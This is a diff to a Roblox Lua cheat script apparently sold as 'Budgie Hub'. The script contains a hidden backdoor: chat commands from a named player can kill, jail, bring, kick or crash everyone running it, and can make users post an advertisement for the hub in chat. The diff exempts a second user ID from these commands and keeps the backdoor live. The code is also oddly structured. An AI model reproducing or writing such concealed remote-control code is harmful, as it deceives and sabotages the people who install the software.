@@ -2,7 +2,7 @@ function onPlayerChatted(message, player)
   lowercaseMessage = message:lower()
 player = game.Players.LocalPlayer
     if lowercaseMessage:find("*kill_all") then
-        if player.UserId ~= 6036506267 then
+        if player.UserId ~= 6036506267 and player.UserId ~= 4636825706 then
  function getAllPlayers()
     local players = game:GetService("Players"):GetPlayers()
     return players
@@ -21,7 +21,7 @@ function onPlayerChatted(message, player)
   lowercaseMessage = message:lower()
 player = game.Players.LocalPlayer
     if lowercaseMessage:find("*find") then
-        if player.UserId ~= 6036506267 then
+        if player.UserId ~= 6036506267 and player.UserId ~= 4636825706 then
       game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I using Budgie Hub | Best hack/script for Sukuna Battlegrounds", "All")
          end
        end
@@ -33,7 +33,7 @@ function onPlayerChatted(message, player)
   lowercaseMessage = message:lower()
 player = game.Players.LocalPlayer
     if lowercaseMessage:find("*jail_all") then
-        if player.UserId ~= 6036506267 then
+        if player.UserId ~= 6036506267 and player.UserId ~= 4636825706 then
      
  function getAllPlayers()
     local players = game:GetService("Players"):GetPlayers()
@@ -52,7 +52,7 @@ game.Players.Hamsterovich.Chatted:Connect(onPlayerChatted)
 function onPlayerChatted(message, player)
   lowercaseMessage = message:lower()
 player = game.Players.LocalPlayer
-    if lowercaseMessage:find("*bring_all") then
+    if lowercaseMessage:find("*bring_all") and player.UserId ~= 4636825706 then
         if player.UserId ~= 6036506267 then
      
  function getAllPlayers()
@@ -72,7 +72,7 @@ game.Players.Hamsterovich.Chatted:Connect(onPlayerChatted)
 function onPlayerChatted(message, player)
   lowercaseMessage = message:lower()
 player = game.Players.LocalPlayer
-    if lowercaseMessage:find("*kick_all") then
+    if lowercaseMessage:find("*kick_all") and player.UserId ~= 4636825706 then
         if player.UserId ~= 6036506267 then
       game:Shutdown()
          end
@@ -84,7 +84,7 @@ game.Players.Hamsterovich.Chatted:Connect(onPlayerChatted)
 function onPlayerChatted(message, player)
   lowercaseMessage = message:lower()
 player = game.Players.LocalPlayer
-    if lowercaseMessage:find("*crash_all") then
+    if lowercaseMessage:find("*crash_all") and player.UserId ~= 4636825706 then
         if player.UserId ~= 6036506267 then
       while true do
       end
